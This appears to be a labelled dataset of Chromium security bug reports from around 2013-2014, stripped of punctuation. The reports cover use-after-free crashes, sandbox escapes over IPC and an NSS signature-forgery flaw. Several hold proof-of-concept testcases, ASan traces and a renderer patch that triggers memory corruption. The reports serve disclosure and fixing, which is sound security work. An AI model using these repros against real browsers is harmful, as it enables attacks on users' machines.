drag-and-drop files not working on windows aura useragent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/32.0.1700.72 safari/537.36 steps to reproduce the problem 1 go to 2 drag files not directories onto the drop area what is the expected behavior the file should be interpreted and read correctly event.datatransfer.items should read all files and be of length equal to the number of files also event.datatransfer.files should read all files and be of length equal to the number of files what went wrong event.datatransfer.items reads an additional datatransferitem as a string the url of the file if available meaning event.datatransfer.items.length numfiles 1 and event.datatransfer.files.length numfiles this is changed functionality from chrome version 31 did this work before yes 31.0.1650.63 m chrome version 32.0.1700.72 channel beta os version 6.1 windows 7 windows server 2008 r2 flash version shockwave flash 12.0 r0	11
viewhostmsg_createwindow next route_id can be taken from the wrong process viewhostmsg_createwindow handler generates the next route_id using renderwidgethelper associated with the rph that received the ipc message rvh passes the route_id on to its webcontentsimpl that creates a new view webcontentsimpl might put the new view into a different process from the one that sent viewhostmsg_createwindow in which case the route_id is wrong and could collide with another view so webcontentsimpl should put the new view created by viewhostmsg_createwindow in a different process from the sender ipc fuzzer achieves that by forcing webcontentsimpl to switch the current rvh to another rvh in another process while the new rvh has n't yet completed navigation webcontentsimpl still points to the old rvh during that time the new rvh receives a viewhostmsg_createwindow which causes a view to be created in the old process with the next routing_id from the new process i ve seen two crash stacks related to having two rvh s with the same process and route_id id one is a uaf of rph the other is a use of std map end reproducer attached is a reproducer for the std map end case apply duplicate_rvh_renderer.patch and open duplicate_rvh.html click on the link and wait 3 seconds it should print something like new rvh process=2 routing_id=-2 new rvh process=2 routing_id=3 new rvh process=3 routing_id=-2 creating evil window new rvh process=2 routing_id=3 asan sigsegv so it creates two rvh s with process=2 and routing_id=3 i tested it on ubuntu 12.04 chrome 31.0.1611.0 and 32.0.1670.0 m30 should also be affected by looking at the code	2
security leaking the raw global object when passing callbacks between contexts vulnerability details when passing callbacks between contexts iframes and detaching an iframe the callback gets access to the raw global object i.e without the security checks enabled on it version since eva reproduction case see http/tests/security/naked-global-object.html	2
uaf of colorchooseraura testcase from ipc_fuzzer_gen it causes a uaf of colorchooseraura when i press ctrl+c from the console not yet sure if an attacker can trigger it without user interaction stack trace is attached	2
assertion failed obj isrenderinline obj this unknown in webcore renderblockflow createlineboxes detailed report fuzzer inferno_twister_custom_bundle job type linux_asan_content_shell_drt crash type unknown crash address crash state crash stack webcore renderblockflow createlineboxes webcore renderblockflow constructline webcore renderblockflow createlineboxesfrombidiruns regressed minimized testcase 0.27 kb download video controls style keyframes cfpulse0 0 opacity 0.5382 animation-name cfpulse94 float right keyframes cfpulse1 0 opacity 0.6321 100 opacity 0.4671 animation-name cfpulse91 shape-inside rectangle 85px 7px 64 91	2
unknown in tintermsymbol tintermsymbol detailed report fuzzer amtinits_glsl_grammar job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack tintermsymbol tintermsymbol tintermediate addsymbol yyparse regressed minimized testcase 0.76 kb download script id fshader invariant fmgd jyndjl mediump ivec4 q q z script script function shader gl program shadertype shaderid var shadersource document.getelementbyid shaderid text var shader gl.createshader shadertype gl.shadersource shader shadersource gl.compileshader shader var setupprogram function gl shader gl program gl.fragment_shader fshader var gl document.createelement canvas getcontext experimental-webgl setupprogram gl var program gl.createprogram for var i 0 i 500 i gl.readpixels 0 0 1 1 gl.rgba gl.unsigned_byte new uint8array 4 script	2
the gpu sandbox sometimes call initializesandbox with threads appearing running our telemetry tests show bots having their gpu sandbox disabled because initializesandbox detects threads running this bug is especially problematic because of issue 327824 i.e when called with threads initializesandbox will return without starting a sandbox without any verbose failure startsandboxlinux in content/gpu does if watchdog_thread watchdog_thread stop watchdog_thread inherits from base thread where stop is pthread_join pthread_join waits for the thread to be terminated however pthread_join is implemented with a futex when the thread is dead userland memory gets updated cf clone_child_cleartid and the caller gets notified i suspect that at that time the kernel information at proc/self/stats and proc/self/task is not synchronously updated and that sandboxlinux issinglethreaded could return false if it wins a race after watchdog_thread stop returns we should wait for proc/self/stats to show the current process as monothreaded	2
chrome_chromeos crash report webcore kurl init wondering if it could be due to product name chrome_chromeos magic signature webcore kurl init current link 0 search properties product.name chrome_chromeos product.version 33.0.1750.58 custom_data.chromecrashproto.ptype renderer custom_data.chromecrashproto.magic_signature_1.name webcore kurl init stacksignature webcore kurl init-11af2377 metadata product name chrome_chromeos product version 33.0.1750.58 report id 5003da43eab45a47 report time tue 04 feb 2014 17:21:10 gmt uptime 92521 ms cumulative uptime 0 ms user email os name linux os version 0.0.0 linux 3.4.0 1 smp tue jan 28 20:55:37 pst 2014 x86_64 cpu architecture amd64 cpu info family 6 model 42 stepping 7 thread 0 crashed sigsegv 18446683221124088256 magic signature thread chrome kurl.cpp:746 webcore kurl init chrome kurl.cpp:184 webcore kurl kurl chrome historyitem.cpp:114 webcore historyitem url chrome frameloader.cpp:1476 webcore frameloader loadhistoryitem chrome historycontroller.cpp:179 webcore historycontroller gotoentry chrome historycontroller.cpp:227 webcore historycontroller gotoitem chrome webframeimpl.cpp:944 blink webframeimpl loadhistoryitem chrome render_view_impl.cc:1448 content renderviewimpl onnavigate chrome tuple.h:548 content renderviewimpl onmessagereceived chrome message_router.cc:49 content messagerouter routemessage chrome child_thread.cc:392 content childthread onmessagereceived chrome ipc_channel_proxy.cc:260 ipc channelproxy context ondispatchmessage chrome callback.h:401 base messageloop runtask chrome message_loop.cc:523 base messageloop deferorrunpendingtask chrome message_loop.cc:637 base messageloop dowork chrome message_pump_default.cc:32 base messagepumpdefault run chrome run_loop.cc:47 base runloop run chrome message_loop.cc:321 base messageloop run chrome renderer_main.cc:251 content renderermain chrome content_main_runner.cc:397 content runzygote chrome content_main_runner.cc:480 content runnamedprocesstypemain chrome content_main_runner.cc:791 content contentmainrunnerimpl run chrome content_main.cc:35 content contentmain chrome chrome_main.cc:39 chromemain libc-2.15.so libc-start.c:234 libc_start_main chrome	2
use refptr in pagewidgetdelegate and guard renderview we will merge this for m33	2
use-after-free in content webplugindelegatestub webplugindelegatestub detailed report fuzzer inferno_twister job type windows_syzyasan_content_shell crash type use-after-free read 4 crash address crash state crash stack content webplugindelegatestub webplugindelegatestub content webplugindelegatestub scalar deleting destructor free stack content webplugindelegatestub scalar deleting destructor std destroy_range std allocator scoped_refptr content webplugindelegatestub additional requirements requires interaction gestures	2
heap-use-after-free in webcore element focus detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_mp crash type heap-use-after-free read 4 crash address crash state crash stack webcore element focus webcore datetimeeditelement layout free stack webcore containernode removechild webcore datetimeeditelement layout unreliable crash found using linux_tsan_chrome_mp job type history_size=5 additional requirements requires interaction gestures	2
partialcircularbuffer is unsafe to use across security boundaries when used cross process with bufferdata stored in shared memory like chromewebrtclogmessagedelegate webrtclogginghandlerhost and webrtcloguploader the less privileged process influence reads and writes in the more privileged process leading to memory corruption for example this can be accomplished by writing bad value bufferdata wrap_position from an unprivileged process before the privileged process enters partialcircularbuffer write where position will be equal to data_size on the next write the privileged process will write to an invalid offset from the buffer allowing a write to an arbitrary address similar conditions can be created within read which would allow arbitrary memory to be read this mechanism seems over engineered i would be much happier if we simple passed log messages as strings across the ipc channel rather than setting up a shared memory region	2
unknown in usr/lib/x86_64-linux-gnu/libstdc++.so.6 detailed report fuzzer ipc_fuzzer_mut job type linux_asan_chrome_ipc crash type unknown crash address crash state crash stack usr/lib/x86_64-linux-gnu/libstdc++.so.6 net priorityqueue content resourcescheduler scheduledresourcerequest insert content resourcescheduler requestqueue insert minimized testcase 7755.32 kb	2
heap-use-after-free in webcore renderblockflow determinestartposition detailed report fuzzer inferno_twister job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderblockflow determinestartposition webcore renderblockflow layoutrunsandfloats free stack webcore node detach webcore containernode detach regressed minimized testcase 1.63 kb	2
security sandbox escape due to vector length mismatch in indexeddbhostmsg_databaseput ipc message indexeddbhostmsg_databaseput takes the following struct as an argument ipc_struct_begin indexeddbhostmsg_databaseput_params ipc_struct_member std vector int64 index_ids ipc_struct_member std vector std vector content indexeddbkey index_keys index_ids and index_keys are passed through the following call chain indexeddbdispatcherhost databasedispatcherhost onput indexeddbdatabase put indexeddbdatabase putoperation makeindexwriters putoperation has this dcheck dcheck_eq params index_ids.size params index_keys.size makeindexwriters has this dcheck dcheck_eq index_ids.size index_keys.size both of these are debug-only so it s possible to reach the following loop with index_ids larger than index_keys std map int64 indexeddbdatabase indexkeys index_key_map for size_t i 0 i index_ids.size i index_key_map index_ids i index_keys i this will read an indexkey out of bounds which seems to be a suitably interesting type for exploitation it contains vectors and strings most interestingly aedla found basically exactly this bug a year ago crbug.com/174895 crrev.com/182008 but the very next revision to touch that file less than two days later removed the sanity check on the vector lengths crrev.com/182392 reintroducing the bug you can repro the bug by applying this renderer patch and navigating to a page which uses indexdb eg and add a book to the demo webapp snip diff git a/content/child/indexed_db/indexed_db_dispatcher.cc b/content/child/indexed_db/indexed_db_dispatcher.cc index d2de316 6221131 100644 a/content/child/indexed_db/indexed_db_dispatcher.cc b/content/child/indexed_db/indexed_db_dispatcher.cc 359,6 359,9 void indexeddbdispatcher requestidbdatabaseput indexeddbkey indexeddbkeybuilder build index_keys i j for int i 0 i 100 i params.index_ids.push_back 10000+i send new indexeddbhostmsg_databaseput params snip	2
stack-use-after-return in mesa_optimize_program detailed report fuzzer amtinits_glsl_mutation job type linux_asan_chrome_mp crash type stack-buffer-overflow read 4 crash address crash state crash stack mesa_optimize_program mesa_ir_link_shader mesa_glsl_link_shader regressed minimized testcase 16.90 kb	2
tracking bug for internal security fixes for chrome 33 release 0 high medium low	2
heap-use-after-free in content mediastreammanager finalizeenumeratedevices detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state crash stack content mediastreammanager finalizeenumeratedevices content mediastreammanager devicesenumerated free stack content browsermessagefilter internal internal ipc channelproxy context onchannelclosed minimized testcase 6179.74 kb	2
heap-use-after-free in task_manager extensionprocessresource getprofilename detailed report fuzzer aedla_ipc_fuzzer job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state crash stack task_manager extensionprocessresource getprofilename taskmanagermodel getresourceprofilename free stack content renderwidgethostimpl shutdown content renderviewhostmanager renderviewhostmanager	2
uaf utterance should not keep a raw pointer to ttsmessagefilter found by a generational ipc fuzzer from tsepez utterance keeps a raw pointer to ttsmessagefilter utteranceeventdelegate event_delegate if a renderer dies and ttsmessagefilter is freed an utterance pointing to it can remain alive it will call event_delegate onttsevent when it finishes causing a uaf repro script function kill_renderer bufs while true bufs.push new arraybuffer 10000000000 function speak if speechsynthesis.speaking kill_renderer countdown three two one crash speechsynthesis.speak new speechsynthesisutterance countdown settimeout speak 500 speak script tested it on stable and trunk builds with ubuntu 12.04 need to use enable-speech-synthesis command line flag for stable and beta	2
heap-use-after-free in webcore svgimage setcontainersize tested on os ubuntu 12.04 chromium asan 34.0.1837.0 developer build 250634 to reproduce the issue create a small html that loads the attached svg-file into an image-tag like this html img id boom src=./chrome-heap-use-after-free-webcorerendersvgrootsetcontainersize.svg width=5 height=5 img script setinterval function boom.width=10 boom.height=20 10 setinterval function boom.width=100 boom.height=200 5 script html asan-trace 13907==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 chrome 0 in webcore rendersvgroot setcontainersize webcore intsize const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/svg/rendersvgroot.h:56:0 1 in webcore svgimage setcontainersize webcore intsize const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/graphics/svgimage.cpp:133:0 2 in webcore svgimage drawforcontainer webcore graphicscontext webcore floatsize float webcore floatrect const webcore floatrect const webcore compositeoperator blink webblendmode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/graphics/svgimage.cpp:180:0 3 in webcore graphicscontext drawimage webcore image webcore floatrect const webcore floatrect const webcore compositeoperator blink webblendmode webcore respectimageorientationenum bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/graphicscontext.cpp:1136:0 4 in webcore graphicscontext drawimage webcore image webcore floatrect const webcore floatrect const webcore compositeoperator webcore respectimageorientationenum bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/graphicscontext.cpp:1115:0 5 in webcore graphicscontext drawimage webcore image webcore intrect const webcore compositeoperator webcore respectimageorientationenum bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/graphicscontext.cpp:1105:0 6 in webcore renderimage paintintorect webcore graphicscontext webcore layoutrect const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderimage.cpp:473:0 7 in webcore renderimage paintreplaced webcore paintinfo webcore layoutpoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderimage.cpp:385:0 8 in webcore renderreplaced paint webcore paintinfo webcore layoutpoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderreplaced.cpp:166:0 9 in webcore renderimage paint webcore paintinfo webcore layoutpoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderimage.cpp:394:0 10 in webcore renderblock paintasinlineblock webcore renderobject webcore paintinfo webcore layoutpoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:2128:0 is located 184 bytes inside of 352-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl_:0 1 in webcore node detach webcore node attachcontext const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/node.cpp:1023:0 2 in webcore element detach webcore node attachcontext const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/element.cpp:1483:0 3 in webcore node reattach webcore node attachcontext const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/node.cpp:990:0 4 in webcore element recalcownstyle webcore stylerecalcchange b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/element.cpp:1607:0 5 in webcore element recalcstyle webcore stylerecalcchange webcore text b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/element.cpp:1574:0 6 in webcore document updatestyleifneeded b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/document.cpp:1801:0 7 in webcore frameview performprelayouttasks b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/frame/frameview.cpp:752:0 8 in webcore frameview layout bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/frame/frameview.cpp:867:0 9 in webcore frameview scrollbarexistencedidchange b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/frame/frameview.cpp:1757:0 10 in webcore scrollview updatescrollbars webcore intsize const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/scroll/scrollview.cpp:344:0	11
heap-use-after-free in webcore formassociatedelement formremovedfromtree tested on os ubuntu 12.04 chromium asan 33.0.1732.0 developer build 239266 repro-file html body div id submenu table form id cse-search-box td align right input name q script type text/javascript var test0=document.getelementbyid cse-search-box var test1=document.getelementbyid submenu test0 q test1.innerhtml settimeout function test1.insertbefore test0 50 settimeout function location.reload 1000 script asan-report 13809==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 chrome 0 in webcore formassociatedelement setform webcore htmlformelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/formassociatedelement.cpp:136:0 1 in webcore htmlformelement removedfrom webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:145:0 2 in webcore childnoderemovalnotifier notifynoderemovedfromdocument webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:237:0 3 in webcore childnoderemovalnotifier notify webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:255:0 4 in webcore private noderemovaldispatcher webcore node webcore containernode true dispatch webcore node webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:141:0 5 in void webcore private addchildnodestodeletionqueue webcore node webcore containernode webcore node webcore node webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:184:0 freed by thread t0 chrome here 0 in interceptor_free asan_rtl_:0 1 in derefifnotnull webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/passrefptr.h:56:0 2 in refptr b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:49:0 3 in refptr b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:49:0 4 in wtf refptr webcore node operator webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:113:0 5 in webcore htmlformelement removefrompastnamesmap webcore htmlelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:759:0 6 in webcore htmlformelement removeformelement webcore formassociatedelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:604:0 7 in webcore formassociatedelement setform webcore htmlformelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/formassociatedelement.cpp:135:0 8 in webcore htmlformelement removedfrom webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:145:0 if this issue is not a duplicate i ll try to analyze it little further tomorrow	11
security asan heap-buffer-overflow in callbitmapxferproc vulnerability details the following testcase crashes the latest asan build version chrome version asan-symbolized-linux-release-246455 operating system linux 64bit reproduction case script function start try o0=tmp document.createelement iframe catch e try document.getelementbyid store_div appendchild tmp catch e try o185=o0.contentdocument.documentelement catch e try o186=o185 catch e try o186.insertadjacenthtml beforeend center style color-rendering webkit-box-reflect below webkit-logical-width 16777218vh webkit-backface-visibility hidden fieldset center style webkit-aspect-ratio padding 3vmax x catch e script body onload='start div id='store_div div body for crashes please include the following additional information type of crash tab crash state asan output attached	11
chrome allows post requests with custom headers using flash 307 redirect useragent mozilla/5.0 windows nt 5.1 applewebkit/537.36 khtml like gecko chrome/31.0.1650.63 safari/537.36 steps to reproduce the problem 1 first use burq suite as a proxy interpect on 2 now go to netfuzzer.com/tuto.swf 3 see the post request is sent to netfuzzer.com/redirect.php that redirects the browser to google.com.br 4 after the another post request with custom headers on google.com.br domain what is the expected behavior what went wrong chrome allowed send post requests with custom headers did this work before n/a chrome version 31.0.1650.63 channel stable os version 5.1 windows xp flash version shockwave flash 11.9 r900	5
security tls handshake and certificate signature forgery is possible using bleichenbachers low-exponent attack due to faulty asn.1 length decoding version chrome version all versions of chrome that use nss for tls and/or certificate verification operating system all operating systems where chrome uses nss for tls and/or certificate verification i first reported this issue in mozilla bug 1064670 i am reporting it here to comply with chromium s security bug reporting program nss s pkcs 1 signature verification logic uses the sec_quickderdecodeitem function to decode the digestinfo part of the signature consequently due to a bug in sec_quickderdecodeitem nss s pkcs 1 signature verification logic is still vulnerable to bleichenbachers low-exponent attack see for a good explanation of the low-exponent attack and how to exploit it and mozilla bug 1064636 mozilla bug 351079 and mozilla bug 350640 in quickder.c the function definite_length_decoder is used to decode tags and lengths it decodes the length as follows unsigned int data_len data_len buf used_length if data_len int len_count data_len data_len 0 while len_count 0 if used_length length return null data_len data_len 8 buf used_length note that there is no check that the encoding of the length is the shortest necessary encoding and also note the integer overflow of data_len see the attached test which verifies that nss s sec_quickderdecodeitem a.k.a quickder accepts many malformed encodings of asn.1 lengths note in particular the test case where the length of the null item is encoded as arbitrary junk which is wrongly interpreted by quickder as equivalent to on both 32-bit and 64-bit platforms the attached gtest integrates into gecko s mozilla pkix test suite for my own convenience however it does n't use any of the mozilla pkix or gecko gtest utilities so it should be easy to integrate it into your gtest-based test suite this problem affects chrome s verification of serverkeyexchange messages in the tls handshake allowing mitm on a tls connection by forging the serverkeyexchange message s signature it also may affect certificate verification on some platforms allowing for forged certificates it may also affect webcrypto and any other parts of chrome that may depend on pkcs 1 signature verification credits antoine delignat-lavaud originally pointed out another issue with nss s verification of pkcs 1 signatures which is bug 106463 after seeing his bug report i discovered this separate issue with the decoding of asn.1 lengths which is a much easier afaict vulnerability to exploit to forge signatures after i shared this vulnerability in the nss bug database antoine delignat-lavaud successfully used it to forge a certificate that chains to a root ca trusted in some versions of nss he attached it to a different bug bug 106463 i wo n't attach his poc here since he created it not me however adam langley ryan sleevi and wan-teh chang have access to mozilla s bug 106463 so they can access the poc please make sure antoine gets credit for creating the poc certificate i recommend thoroughly reading all the comments in mozilla bug 351079 and mozilla bug 350640 in particular note that there may be compatibility issues with strictly matching digestinfo byte-for-byte	5
heap-use-after-free in webcore speechsynthesis cancel vulnerability details it is possible to use m_currentspeechutterance variable of speechsynthesis.cpp after it is freed test case script speechsynthesis.speak new speechsynthesisutterance hello speechsynthesis.cancel window.gc speechsynthesis.cancel script same or similar issues 1 based on changeset i assume this issue is fixed for mac and not for linux anyway need to further investigate 2 3 version chrome version 34.0.1847.0 developer build 251903 aura trunk build blink version 537.36 167392 does not reproduce in official beta version 33.0.1750.112 but reproduces in beta version 33.0.1750.91 built with asan downloaded prebuilt asan version from operating system ubuntu 12.04 64 bit reproduction case 1 run chrome built with asan with this flag js-flags expose-gc 2 run above mentioned test case in chrome for crashes please include the following additional information type of crash tab crash state address sanitizer output addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 chrome 0 in wtf refcountedbase ref out/release third_party/webkit/source/wtf/refcounted.h:61 1 in webcore speechsynthesis cancel out/release third_party/webkit/source/modules/speech/speechsynthesis.cpp:130 2 in webcore speechsynthesisv8internal cancelmethodcallback v8 functioncallbackinfo v8 value const out/release/gen/blink/bindings/v8speechsynthesis.cpp:176 3 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const out/release v8/src/arguments.cc:56 4 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1215 5 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate out/release v8/src/builtins.cc:1231 is located 12 bytes inside of 128-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl 1 in v8 internal globalhandles node postgarbagecollectionprocessing v8 internal isolate out/release v8/src/global-handles.cc:270 2 in v8 internal globalhandles postgarbagecollectionprocessing v8 internal garbagecollector v8 internal gctracer out/release v8/src/global-handles.cc:679 3 in v8 internal heap performgarbagecollection v8 internal garbagecollector v8 internal gctracer v8 gccallbackflags out/release v8/src/heap.cc:1161 4 in v8 internal heap collectgarbage v8 internal garbagecollector char const char const v8 gccallbackflags out/release v8/src/heap.cc:822 5 in v8 internal heap collectgarbage v8 internal allocationspace char const v8 gccallbackflags out/release v8/src/heap-inl.h:558 6 in v8 internal heap collectallgarbage int char const v8 gccallbackflags out/release v8/src/heap.cc:712 7 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const out/release v8/src/arguments.cc:56 8 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1215 9 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate out/release v8/src/builtins.cc:1231 10 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool out/release v8/src/execution.cc:119 11 in v8 script run out/release v8/src/api.cc:1743 12 in webcore v8scriptrunner runcompiledscript v8 handle v8 script webcore executioncontext v8 isolate out/release third_party/webkit/source/bindings/v8/v8scriptrunner.cpp:97 13 in webcore scriptcontroller executescriptandreturnvalue v8 handle v8 context webcore scriptsourcecode const webcore accesscontrolstatus out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:213 14 in webcore scriptcontroller evaluatescriptinmainworld webcore scriptsourcecode const webcore accesscontrolstatus webcore scriptcontroller executescriptpolicy out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:617 15 in webcore scriptcontroller executescriptinmainworld webcore scriptsourcecode const webcore accesscontrolstatus out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:588 16 in webcore scriptloader executescript webcore scriptsourcecode const out/release third_party/webkit/source/core/dom/scriptloader.cpp:333 17 in webcore scriptloader preparescript wtf textposition const webcore scriptloader legacytypesupport out/release third_party/webkit/source/core/dom/scriptloader.cpp:243 18 in webcore htmlscriptrunner runscript webcore element wtf textposition const out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:297 19 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:172 20 in webcore htmldocumentparser runscriptsforpausedtreebuilder out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:255 21 in webcore htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr webcore htmldocumentparser parsedchunk out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:436 22 in webcore htmldocumentparser pumppendingspeculations out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:474 23 in webcore htmldocumentparser didreceiveparsedchunkfrombackgroundparser wtf passownptr webcore htmldocumentparser parsedchunk out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:317 24 in wtf functionwrapper void webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator wtf weakptr webcore htmldocumentparser const wtf passownptr webcore htmldocumentparser parsedchunk out/release third_party/webkit/source/wtf/functional.h:210 25 in wtf boundfunctionimpl wtf functionwrapper void webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk void wtf weakptr webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator out/release third_party/webkit/source/wtf/functional.h:420 previously allocated by thread t0 chrome here 0 in interceptor_malloc asan_rtl 1 in wtf partitionallocgenericflags wtf partitionrootgeneric int unsigned long out/release third_party/webkit/source/wtf/partitionalloc.h:530 2 in webcore speechsynthesisutterance create webcore executioncontext wtf string const out/release third_party/webkit/source/modules/speech/speechsynthesisutterance.cpp:35 3 in webcore speechsynthesisutterancev8internal constructor v8 functioncallbackinfo v8 value const out/release/gen/blink/bindings/v8speechsynthesisutterance.cpp:439 4 in webcore v8speechsynthesisutterance constructorcallback v8 functioncallbackinfo v8 value const out/release/gen/blink/bindings/v8speechsynthesisutterance.cpp:477 5 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const out/release v8/src/arguments.cc:56 6 in v8 internal maybeobject v8 internal handleapicallhelper true v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1215 7 in v8 internal builtin_handleapicallconstruct int v8 internal object v8 internal isolate out/release v8/src/builtins.cc:1236 8 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool out/release v8/src/execution.cc:119 9 in v8 script run out/release v8/src/api.cc:1743 10 in webcore v8scriptrunner runcompiledscript v8 handle v8 script webcore executioncontext v8 isolate out/release third_party/webkit/source/bindings/v8/v8scriptrunner.cpp:97 11 in webcore scriptcontroller executescriptandreturnvalue v8 handle v8 context webcore scriptsourcecode const webcore accesscontrolstatus out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:213 12 in webcore scriptcontroller evaluatescriptinmainworld webcore scriptsourcecode const webcore accesscontrolstatus webcore scriptcontroller executescriptpolicy out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:617 13 in webcore scriptcontroller executescriptinmainworld webcore scriptsourcecode const webcore accesscontrolstatus out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:588 14 in webcore scriptloader executescript webcore scriptsourcecode const out/release third_party/webkit/source/core/dom/scriptloader.cpp:333 15 in webcore scriptloader preparescript wtf textposition const webcore scriptloader legacytypesupport out/release third_party/webkit/source/core/dom/scriptloader.cpp:243 16 in webcore htmlscriptrunner runscript webcore element wtf textposition const out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:297 17 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:172 18 in webcore htmldocumentparser runscriptsforpausedtreebuilder out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:255 19 in webcore htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr webcore htmldocumentparser parsedchunk out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:436 20 in webcore htmldocumentparser pumppendingspeculations out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:474 21 in webcore htmldocumentparser didreceiveparsedchunkfrombackgroundparser wtf passownptr webcore htmldocumentparser parsedchunk out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:317 22 in wtf functionwrapper void webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator wtf weakptr webcore htmldocumentparser const wtf passownptr webcore htmldocumentparser parsedchunk out/release third_party/webkit/source/wtf/functional.h:210 23 in wtf boundfunctionimpl wtf functionwrapper void webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk void wtf weakptr webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator out/release third_party/webkit/source/wtf/functional.h:420 24 in wtf callfunctionobject void out/release third_party/webkit/source/wtf/mainthread.cpp:62 assert failiure on debug build assertion failed m_currentspeechutterance third_party/webkit/source/modules/speech/speechsynthesis.cpp 134 void webcore speechsynthesis cancel	11
